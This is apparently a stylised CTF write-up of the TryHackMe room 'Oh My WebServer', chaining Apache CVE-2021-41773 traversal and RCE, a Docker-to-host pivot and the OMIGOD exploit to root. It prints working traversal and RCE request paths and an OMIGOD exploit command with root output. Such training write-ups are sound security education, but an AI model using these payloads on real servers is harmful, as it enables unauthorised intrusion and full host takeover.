# 
```
 ██████╗ ██╗  ██╗    ███████╗██╗   ██╗    ██╗    ██╗███████╗██████╗ ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
██╔═══██╗██║  ██║    ████╗  ███║ ████║    ██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║   ██║███████║    ██╔████╗██║ ╚██║    ██║ █╗ ██║█████╗  ██████╔╝███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║   ██║██╔══██║    ██║╚██╔╝██║  ██║    ██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║    ██║ ╚═╝ ██║  ██║    ╚███╔███╔╝███████╗██████╔╝███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
```

<div align="center">

### 🔥 A Real-World Journey Through Apache CVEs, Docker Escapes & Cloud Vulnerabilities 🔥

**[CVE-2021-41773]** • **[Path Traversal RCE]** • **[Docker Escape]** • **[OMIGOD]** • **[Medium Difficulty]**

---

*"The path to root is paved with thorough enumeration and a deep understanding of system architecture."*

</div>

---

## 🎯 THE MISSION

```
┌─────────────────────────────────────────────────────────┐
│  TARGET: 10.49.184.78                                   │
│  OBJECTIVE: Container → Host → Root                     │
│  DIFFICULTY: ████████░░ Medium                          │
│  CVSS IMPACT: ███████████ CRITICAL (9.8)                │
└─────────────────────────────────────────────────────────┘
```

This isn't just another CTF. **Oh My WebServer** simulates a real-world Azure cloud environment with multiple layers of security failures. One outdated web server. One Docker misconfiguration. One cloud management service. **Complete system compromise.**

**The Challenge:** Can you chain three critical vulnerabilities to escape a container and own the host?

---

## ⚡ WHAT AWAITS YOU

```
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  🌐 APACHE 2.4.49       →  Critical path traversal CVE      │
│  🐳 DOCKER CONTAINER    →  Your first prison                │
│  🔓 CGI MISCONFIGURED   →  The key to RCE                   │
│  🌩️  CLOUD MANAGEMENT   →  Hidden OMI service               │
│  👑 ROOT ON HOST        →  The ultimate prize               │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## 📖 THE STORY: FROM WEB TO ROOT

### 🔍 ACT I: THE DISCOVERY

```
PORT      STATE    SERVICE       VERSION
80/tcp    open     http          Apache httpd 2.4.49

🚨 VULNERABILITY DETECTED: CVE-2021-41773
   CVSS Score: 7.5 → 9.8 (with CGI)
   Status: CRITICAL
```

One version number. One Google search. **Game on.**

Apache 2.4.49 was vulnerable for only **20 days** before patches. But this server? Still running it.

---

### 💣 ACT II: THE BREACH

```
┌─────────────────────────────────────────────────────┐
│  DISCOVERED: /cgi-bin/                              │
│  STATUS: 403 Forbidden                              │
│  DANGER LEVEL: ████████████ MAXIMUM                 │
└─────────────────────────────────────────────────────┘
```

**Path Traversal Attack:**
```bash
/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd
```
**Result:** ✅ File read successful

**Remote Code Execution:**
```bash
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/bash
```
**Result:** 🎯 Reverse shell obtained

---

### 🐳 ACT III: THE PRISON

```
daemon@container:/$ ls -la /
-rwxr-xr-x   1 root root    0 Oct 15  2021 .dockerenv  ← 💀

daemon@container:/$ hostname -I
172.17.0.2  ← Docker network

daemon@container:/$ arp -a
? (172.17.0.1) ← Docker host reachable
```

**You're not on the real system.** You're in a container. The real target is at `172.17.0.1`.

**Docker is not a security boundary** — it's a stepping stone.

---

### 🌐 ACT IV: THE PIVOT

```
# Scan the Docker host from inside the container
/tmp/nmap 172.17.0.1 -p- --min-rate 5000

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5986/tcp open  🚨 UNKNOWN
```

**Port 5986 on a Linux machine?**

That's not WinRM. That's **OMI** (Open Management Infrastructure).

**Microsoft's cloud management service. Running with root privileges. With a critical RCE vulnerability.**

---

### 👑 ACT V: THE CROWN

```
╔════════════════════════════════════════════════════╗
║  CVE-2021-38647: OMIGOD                            ║
║  Impact: Unauthenticated Remote Code Execution     ║
║  Privileges: ROOT                                  ║
║  CVSS Score: 9.8 (CRITICAL)                        ║
╚════════════════════════════════════════════════════╝
```

One Python exploit. One command:

```bash
python3 CVE-2021-38647.py -t 172.17.0.1 -c 'whoami;cat /root/root*'
```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root)
THM{f4ec19f4d9bc9f7e7edc46c0ce1e44c6}
```

**Mission accomplished.** 🎯

---

## 🛠️ THE KILL CHAIN

```
╔═══════════════════════════════════════════════════════════╗
║                    ATTACK PROGRESSION                      ║
╠═══════════════════════════════════════════════════════════╣
║                                                           ║
║  1. Nmap Recon          →  Apache 2.4.49 identified      ║
║  2. Directory Fuzzing   →  /cgi-bin/ discovered          ║
║  3. Path Traversal      →  /etc/passwd read              ║
║  4. CGI + Traversal     →  RCE achieved                  ║
║  5. Reverse Shell       →  Container access              ║
║  6. Docker Detection    →  .dockerenv found              ║
║  7. Network Discovery   →  Host at 172.17.0.1            ║
║  8. Host Port Scan      →  OMI on 5986 found             ║
║  9. OMIGOD Exploit      →  Root shell obtained           ║
║  10. Flag Capture       →  COMPLETE COMPROMISE           ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
```

---

## 💡 VULNERABILITY BREAKDOWN

| CVE | Service | Impact | CVSS |
|-----|---------|--------|------|
| **CVE-2021-41773** | Apache 2.4.49 | Path Traversal → RCE | 7.5 → 9.8 |
| **CVE-2021-42013** | Apache 2.4.49/50 | Enhanced Bypass | 9.8 |
| **CVE-2021-38647** | OMI (Azure Agent) | Unauth RCE as root | 9.8 |

---

## 🧠 WHAT YOU'LL LEARN

```
┌─────────────────────────────────────────────────────────┐
│  ✓ Modern Web Vulnerability Exploitation               │
│  ✓ Path Traversal Attack Techniques                    │
│  ✓ CGI Misconfiguration Abuse                          │
│  ✓ Docker Container Enumeration                        │
│  ✓ Container Escape Methodologies                      │
│  ✓ Network Pivoting Strategies                         │
│  ✓ Cloud Infrastructure Weaknesses                     │
│  ✓ Real-World CVE Exploitation                         │
└─────────────────────────────────────────────────────────┘
```

---

## 🎯 THE METHODOLOGY

```
    ┌──────────────┐
    │ ENUMERATION  │ ← Never stop here
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   RESEARCH   │ ← CVE databases are your friend
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │    EXPLOIT   │ ← Chain vulnerabilities
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │  ENUMERATE   │ ← Start again in new context
    └──────┬───────┘
           │
           ▼
    ┌──────────────┐
    │   ESCALATE   │ ← Root access achieved
    └──────────────┘
```

---

## 🔥 CRITICAL INSIGHTS

### 🌐 Apache Misconfigurations Kill

**The Reality:**
- Apache 2.4.49 was patched in 2.4.51
- Thousands of servers remained vulnerable
- Single CVE → Complete system compromise

**The Lesson:** Patch management isn't optional. It's survival.

---

### 🐳 Docker ≠ Security

**The Reality:**
- Containers provide isolation, not protection
- Network access = pivot opportunity
- Container compromise → Host compromise

**The Lesson:** Defense in depth. Always.

---

### ☁️ Cloud Agents Are Attack Vectors

**The Reality:**
- OMI auto-installs on Azure Linux VMs
- Runs as root by default
- Most admins don't know it exists

**The Lesson:** Audit everything. Even "management" services.

---

## 📊 EXPLOITATION TIMELINE

```
╔═══════════════════════════════════════════════════╗
║  TIME     │  ACTION           │  RESULT           ║
╠═══════════════════════════════════════════════════╣
║  00:00    │  Nmap scan        │  Apache found     ║
║  00:05    │  Directory fuzz   │  /cgi-bin/ found  ║
║  00:10    │  Path traversal   │  Confirmed vuln   ║
║  00:15    │  RCE exploit      │  Shell obtained   ║
║  00:20    │  Docker detected  │  Pivot required   ║
║  00:30    │  Host scan        │  OMI discovered   ║
║  00:45    │  OMIGOD exploit   │  Root achieved    ║
║  00:55    │  Flag captured    │  ✓ COMPLETE       ║
╚═══════════════════════════════════════════════════╝
```

**Total Time:** ~55 minutes  
**CVEs Exploited:** 2  
**Systems Compromised:** 2 (container + host)  
**Flags Captured:** 1  

---

## 🎓 KEY TAKEAWAYS

```
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ① Version disclosure = vulnerability roadmap      ┃
┃  ② 403 Forbidden ≠ Not exploitable                 ┃
┃  ③ Always enumerate your environment fully         ┃
┃  ④ Containers can access host networks             ┃
┃  ⑤ Cloud management services expand attack surface ┃
┃  ⑥ One CVE is rarely enough — chain them           ┃
┃  ⑦ Enumeration beats exploitation every time       ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
```

---

## 🔧 TOOLS OF THE TRADE

```
┌────────────────────────────────────────────┐
│  ⚡ Nmap       →  Network reconnaissance    │
│  🔍 FFUF       →  Directory fuzzing        │
│  🌐 cURL       →  HTTP manipulation        │
│  🐚 Netcat     →  Reverse shell listener   │
│  🐍 Python     →  Exploit execution        │
│  📝 Metasploit →  Vulnerability research   │
└────────────────────────────────────────────┘
```

---

## 🌟 WHY THIS MATTERS

**Oh My WebServer isn't just a CTF.**

It's a simulation of real attacks happening **right now** in cloud environments:

### Real-World Parallels

| CTF Scenario | Real World |
|--------------|------------|
| Apache 2.4.49 vuln | Thousands of unpatched servers in 2021 |
| Docker container | Kubernetes pod escape attempts |
| OMI service | Azure VM compromises (OMIGOD incidents) |
| Root access | Complete cloud infrastructure takeover |

**This exact attack chain has compromised production systems.**

---

## 💀 THE VULNERABILITY TIMELINE

```
┌─────────────────────────────────────────────────┐
│  September 2021                                 │
│  ├─ Apache 2.4.49 released                      │
│  ├─ CVE-2021-41773 discovered (path traversal)  │
│  ├─ CVE-2021-38647 disclosed (OMIGOD)          │
│  └─ 20 days later: Patches released             │
│                                                 │
│  October 2021                                   │
│  ├─ Widespread exploitation begins              │
│  └─ Thousands of servers compromised            │
│                                                 │
│  2026                                           │
│  └─ Some servers STILL vulnerable               │
└─────────────────────────────────────────────────┘
```

**The lesson?** Vulnerability windows are shrinking. Patch faster.

---

## 🎭 THE PHILOSOPHY

```
╔════════════════════════════════════════════════════════╗
║                                                        ║
║  "Sometimes the most devastating vulnerabilities       ║
║   are in the services we never knew were running."    ║
║                                                        ║
║  "Enumeration is not just a step—it's the            ║
║   foundation of every successful penetration test."   ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
```

When you root this box, you won't just capture a flag.

**You'll understand how modern cloud infrastructures fall.**

---

## 📈 DIFFICULTY ANALYSIS

```
╔═══════════════════════════════════════════════════╗
║  RECONNAISSANCE:     ████████░░  (8/10)           ║
║  EXPLOITATION:       ██████░░░░  (6/10)           ║
║  PRIVILEGE ESC:      ████████░░  (8/10)           ║
║  METHODOLOGY REQ:    ███████████ (10/10)          ║
║  PATIENCE REQ:       ███████░░░  (7/10)           ║
║                                                   ║
║  OVERALL DIFFICULTY: ████████░░  MEDIUM           ║
╚═══════════════════════════════════════════════════╝
```

**Skills Tested:**
- Web vulnerability exploitation
- Container technology understanding
- Network pivoting
- Cloud infrastructure knowledge
- CVE research and adaptation

---

## 🏆 ACHIEVEMENT UNLOCKED

```
┌─────────────────────────────────────────────┐
│                                             │
│        🏆 OH MY WEBSERVER PWNED! 🏆         │
│                                             │
│   ✓ Apache 2.4.49 RCE Exploited            │
│   ✓ Docker Container Compromised           │
│   ✓ Container Escape Successful            │
│   ✓ OMIGOD Vulnerability Leveraged         │
│   ✓ Root Access Achieved                   │
│   ✓ Full System Ownership                  │
│                                             │
│        Room Successfully Completed!         │
│                                             │
└─────────────────────────────────────────────┘
```

---

## 👤 ABOUT THIS CHALLENGE

```
┌────────────────────────────────────────────┐
│  Author: Muhammad Hozaifa Naeem           │
│  THM: @hyena11                             │
│  Email: ssjutt2023@gmail.com              │
│  Date: February 02, 2026                   │
│  Room: Oh My WebServer (TryHackMe)         │
└────────────────────────────────────────────┘
```

---

## 📚 RESOURCES & REFERENCES

```
CVE Resources:
├─ CVE-2021-41773: https://nvd.nist.gov/vuln/detail/CVE-2021-41773
├─ CVE-2021-42013: https://nvd.nist.gov/vuln/detail/CVE-2021-42013
└─ CVE-2021-38647: https://nvd.nist.gov/vuln/detail/CVE-2021-38647

Apache Security:
└─ https://httpd.apache.org/security/vulnerabilities_24.html

Microsoft OMI:
└─ https://github.com/microsoft/omi

Docker Security:
└─ https://docs.docker.com/engine/security/
```

---

<div align="center">

## 🔥 ARE YOU READY? 🔥

**Three vulnerabilities. Two systems. One flag.**

### Can you chain them all?

---

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Oh%20My%20WebServer-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](https://tryhackme.com/)
[![CVE](https://img.shields.io/badge/CVE-2021--41773-critical?style=for-the-badge)](https://nvd.nist.gov/)
[![CVE](https://img.shields.io/badge/CVE-2021--38647-critical?style=for-the-badge)](https://nvd.nist.gov/)

---

### 🎯 THE CHALLENGE AWAITS 🎯

```
┌─────────────────────────────────────────────────────┐
│                                                     │
│  "The difference between knowing about CVEs and     │
│   exploiting them is hands-on experience."          │
│                                                     │
│  "Docker containers are not security boundaries—    │
│   they're just another layer to enumerate."         │
│                                                     │
│  "In cloud environments, management services are    │
│   often the weakest link."                          │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

⚠️ **DISCLAIMER:** This write-up is for educational purposes only. All exploitation was performed in a legal, authorized TryHackMe environment. Always obtain proper authorization before testing any system's security.

---

**Made with 💀 by hyena11**

</div>
